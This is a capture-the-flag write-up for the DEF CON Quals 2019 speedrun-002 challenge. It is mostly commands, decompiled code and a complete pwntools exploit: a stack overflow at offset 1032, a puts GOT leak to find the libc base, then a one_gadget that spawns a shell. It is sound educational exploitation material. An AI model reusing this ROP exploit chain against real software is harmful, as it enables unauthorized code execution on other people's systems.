# checkpoin
- patch the elf file to use the same libc with official
```shell
# before patch
➜  defconquals2019_speedrun_s2 ldd ./speedrun-002_ 
        linux-vdso.so.1 =>  (0x00007ffeec9fa000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fddf0a15000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fddf0ddf000)
➜  defconquals2019_speedrun_s2 patchelf --set-interpreter /home/pitta/workspace/pwn_learn/rec0rd/draftBin/defconquals2019_speedrun_s2/ld-2.27.so ./speedrun-002
➜  defconquals2019_speedrun_s2 patchelf --replace-needed libc.so.6 /home/pitta/workspace/pwn_learn/rec0rd/draftBin/defconquals2019_speedrun_s2/libc-2.27.so
# after patch
➜  defconquals2019_speedrun_s2 ldd ./speedrun-002
        linux-vdso.so.1 =>  (0x00007ffdb276d000)
        /home/pitta/workspace/pwn_learn/rec0rd/draftBin/defconquals2019_speedrun_s2/libc-2.27.so (0x00007f0bc1733000)
        /home/pitta/workspace/pwn_learn/rec0rd/draftBin/defconquals2019_speedrun_s2/ld-2.27.so => /lib64/ld-linux-x86-64.so.2 (0x00007f0bc1b24000)
```

- code reuse

# analyze
```shell
➜  defconquals2019_speedrun_s2 checksec ./speedrun-002 
[*] '/home/pitta/workspace/pwn_learn/rec0rd/draftBin/defconquals2019_speedrun_s2/speedrun-002'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
➜  defconquals2019_speedrun_s2 file ./speedrun-002 
./speedrun-002: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fb0684e50a97ccfc5dbe71bcdcb4a45aacfed414, stripped
➜  defconquals2019_speedrun_s2 ./speedrun-002 
zsh: permission denied: ./speedrun-002
➜  defconquals2019_speedrun_s2 chmod +x ./speedrun-002 
➜  defconquals2019_speedrun_s2 ./speedrun-002 
We meet again on these pwning streets.
What say you now?
[1]    36265 alarm      ./speedrun-002
➜  defconquals2019_speedrun_s2 ./speedrun-002
We meet again on these pwning streets.
What say you now?
give me the flag
What a ho-hum thing to say.
Fare thee well.
```

**IDA view**
```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 v3; // rdi

  setvbuf(stdout, 0LL, 2, 0LL);
  v3 = (__int64)"DEBUG";
  if ( !getenv("DEBUG") )
  {
    v3 = 5LL;
    alarm(5u);
  }
  msg(v3);                                      // wellcome msg include PUTS call
  vulnFunc(v3);
  sub_4007BB(v3);
  return 0LL;
}
// trace vulnFunc
int vulnFunc()
{
  int result; // eax
  char buf[400]; // [rsp+0h] [rbp-590h] BYREF
  char v2[1024]; // [rsp+190h] [rbp-400h] BYREF

  puts("What say you now?");
  read(0, buf, 0x12CuLL);
  if ( !strncmp(buf, "Everything intelligent is so boring.", 0x24uLL) )// need to match
    result = nextStep(v2);                    // step in
  else
    result = puts("What a ho-hum thing to say.");
  return result;
}

// trace nextStep function
ssize_t __fastcall nextStep(void *a1)
{
  puts("What an interesting thing to say.\nTell me more.");
  read(0, a1, 0x7DAuLL);                        // overflow vuln
  return write(1, "Fascinating.\n", 0xDuLL);
}
```

**offset to ret address**
```shell
gdb-peda$ pattern offset DAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHA
DAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHA found at offset: 1032

```


**onegadget**
```shell
➜  defconquals2019_speedrun_s2 one_gadget ./libc-2.27.so   # libc offered by offical
0x4f2be execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv

0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv

0x4f322 execve("/bin/sh", rsp+0x40, environ)    # satisfied constrain
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```
in order to use one_gadget, we need to leak the libc base address.

## leak libc base
use puts function to leak the content of putsGOT.
```shell
➜  defconquals2019_speedrun_s2 readelf -r ./speedrun-002 
    ...
Relocation section '.rela.plt' at offset 0x4b8 contains 7 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000601028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
    ...
```
search for gadget
```shell
➜  defconquals2019_speedrun_s2 ROPgadget --binary ./speedrun-002 --only "pop|ret"
Gadgets information
============================================================
0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040089e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004008a0 : pop r14 ; pop r15 ; ret
0x00000000004008a2 : pop r15 ; ret
0x000000000040089b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040089f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400668 : pop rbp ; ret
0x00000000004008a3 : pop rdi ; ret      # used
0x00000000004006ec : pop rdx ; ret
0x00000000004008a1 : pop rsi ; pop r15 ; ret
0x000000000040089d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400576 : ret

Unique gadgets found: 12

**weaponize**
```
**payload**
```python
payload1 = "A"*1032
payload1 += p64(pop_rdi_ret)
payload1 += p64(putsGOT)
payload1 += p64(putsPLT)
payload1 += p64(ret)
payload1 += p64(0x40071D)

pipe.recvuntil("What say you now?\n")
pipe.sendline("Everything intelligent is so boring.")
pipe.recvline()
pipe.sendline(payload1)
sleep(0.5)
pipe.recvuntil("Fascinating.\x0a")
leak = pipe.recvline().replace("\x0a","")
leak = u64(leak + "\x00"*(8-len(leak)))
log.info("puts address: 0x%x" % leak)

libcBase = leak - libc.symbols["puts"]
log.info("libc base address: 0x%x" % libcBase)
```


# exploit
```python
from pwn import *
# context.log_level = "DEBUG"
pipe = process("./speedrun-002")
libc = ELF("./libc-2.27.so")

pop_rdi_ret = 0x4008a3
putsGOT = 0x601028
putsPLT = 0x4005b0
ret = 0x40074C

payload1 = "A"*1032
payload1 += p64(pop_rdi_ret).decode("iso-8859-1")
payload1 += p64(putsGOT).decode("iso-8859-1")
payload1 += p64(putsPLT).decode("iso-8859-1")
payload1 += p64(ret).decode("iso-8859-1")
# payload1 += p64(0x40071D).decode("iso-8859-1")

pipe.recvuntil("What say you now?\n")
pipe.sendline("Everything intelligent is so boring.")
pipe.recvline()
pipe.sendline(payload1)
pipe.recvuntil("Fascinating.\x0a")

leak = pipe.recvuntil("\x7f")
leak = u64(leak + b"\x00"*(8-len(leak)))
log.info("puts address: 0x%x" % leak)

libcBase = leak - libc.symbols['puts']
log.info("libc base address: 0x%x" % libcBase)



one_gadget = libcBase + 0x4f322
log.info("one_gadget: 0x%x" % one_gadget)
payload = "A" * 1032
payload += p64(one_gadget).decode("iso-8859-1")



pipe.sendline("Everything intelligent is so boring.")
pipe.recvuntil('Tell me more.\n')
pipe.sendline(payload)
sleep(1)
pipe.interactive()
```

**run exp.py**
```shell
  ...
[*] puts address: 0x7f701c9699c0
[*] libc base address: 0x7f701c8e9000
[*] one_gadget: 0x7f701c938322
/home/pitta/workspace/pwn_learn/rec0rd/draftBin/defconquals2019_speedrun_s2/./exp.py:41: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  pipe.sendline("Everything intelligent is so boring.")
/home/pitta/workspace/pwn_learn/rec0rd/draftBin/defconquals2019_speedrun_s2/./exp.py:42: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  pipe.recvuntil('Tell me more.\n')
/home/pitta/workspace/pwn_learn/rec0rd/draftBin/defconquals2019_speedrun_s2/./exp.py:43: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  pipe.sendline(payload)
[*] Switching to interactive mode
Fascinating.
$ ls
core        libc-2.27.so                   README.md
exp.py      libc-2.27.so_                  speedrun-002
ld-2.27.so  peda-session-speedrun-002.txt  speedrun-002_
```